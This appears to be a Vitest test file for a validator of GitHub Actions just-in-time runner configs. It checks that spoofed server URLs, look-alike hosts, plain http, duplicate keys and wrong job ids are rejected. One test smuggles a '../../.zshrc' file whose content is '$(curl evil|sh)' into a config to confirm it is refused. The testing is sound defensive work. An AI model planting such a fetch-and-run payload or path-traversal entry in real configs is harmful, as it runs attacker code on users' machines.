import { describe, expect, it } from "vitest";
import { checkJitConfig } from "./jit-config.ts";
import { fakeJitConfig } from "./jit-config.fixture.ts";

describe("checkJitConfig", () => {
  it("accepts GitHub's config for this route and says which repo it's for", () => {
    expect(checkJitConfig(fakeJitConfig("a1b2"), "a1b2")).toEqual({ ok: true, target: "acme/app" });
  });

  it("names the org for an org runner", () => {
    const config = fakeJitConfig("a1b2", { runner: { GitHubUrl: "https://github.com/acme" } });
    expect(checkJitConfig(config, "a1b2")).toEqual({ ok: true, target: "acme" });
  });

  it("refuses a config that points the runner at another server", () => {
    const config = fakeJitConfig("a1b2", { runner: { ServerUrlV2: "https://evil.example/" } });
    expect(checkJitConfig(config, "a1b2")).toEqual({
      ok: false,
      reason: "it points the runner at https://evil.example, not GitHub",
    });
  });

  it("checks URLs in .credentials too, and look-alike hosts", () => {
    const config = fakeJitConfig("a1b2", {
      credentials: { AuthorizationUrl: "https://github.com.evil.example/token" },
    });
    expect(checkJitConfig(config, "a1b2")).toMatchObject({ ok: false, reason: /not GitHub/ });
  });

  it("refuses plain http, even to GitHub", () => {
    const config = fakeJitConfig("a1b2", { runner: { ServerUrl: "http://github.com/x" } });
    expect(checkJitConfig(config, "a1b2")).toMatchObject({ ok: false, reason: /not GitHub/ });
  });

  it("refuses any file besides GitHub's three, since the runner writes each one to disk", () => {
    const files = JSON.parse(Buffer.from(fakeJitConfig("a1b2"), "base64").toString("utf8"));
    const withExtra = {
      ...files,
      "../../.zshrc": Buffer.from('"$(curl evil|sh)"').toString("base64"),
    };
    const encoded = Buffer.from(JSON.stringify(withExtra)).toString("base64");
    expect(checkJitConfig(encoded, "a1b2")).toMatchObject({
      ok: false,
      reason: /not GitHub's files/,
    });

    const { ".credentials_rsaparams": _, ...missing } = files;
    const short = Buffer.from(JSON.stringify(missing)).toString("base64");
    expect(checkJitConfig(short, "a1b2")).toMatchObject({
      ok: false,
      reason: /not GitHub's files/,
    });
  });

  it("refuses keys that differ only in case, which the runner would read as one", () => {
    const config = fakeJitConfig("a1b2", { runner: { agentname: "zach-mbp-other" } });
    expect(checkJitConfig(config, "a1b2")).toEqual({ ok: false, reason: "it has agentname twice" });
  });

  it("checks URL fields however they're written", () => {
    for (const url of ["https:\\\\evil.example", "https:evil.example", "evil.example/x"]) {
      const config = fakeJitConfig("a1b2", { runner: { ServerUrl: url } });
      expect(checkJitConfig(config, "a1b2")).toMatchObject({ ok: false });
    }
    // Any scheme-looking value counts, whatever its field.
    const other = fakeJitConfig("a1b2", { credentials: { Extra: "ftp:evil.example" } });
    expect(checkJitConfig(other, "a1b2")).toMatchObject({ ok: false, reason: /not GitHub/ });
    // An empty URL field points nowhere.
    const empty = fakeJitConfig("a1b2", { runner: { ServerUrlV2: "" } });
    expect(checkJitConfig(empty, "a1b2")).toMatchObject({ ok: true });
  });

  it("refuses a runner minted for another job", () => {
    expect(checkJitConfig(fakeJitConfig("a1b2"), "c3d4")).toEqual({
      ok: false,
      reason: "its runner zach-mbp-a1b2 isn't for job c3d4",
    });
  });

  it("refuses a config with no server", () => {
    const config = fakeJitConfig("a1b2", { runner: { ServerUrl: null, ServerUrlV2: null } });
    expect(checkJitConfig(config, "a1b2")).toMatchObject({ ok: false, reason: /which GitHub/ });
  });

  it("refuses something that isn't a config at all", () => {
    expect(checkJitConfig("abc", "a1b2")).toEqual({
      ok: false,
      reason: "it isn't a runner config",
    });
  });
});
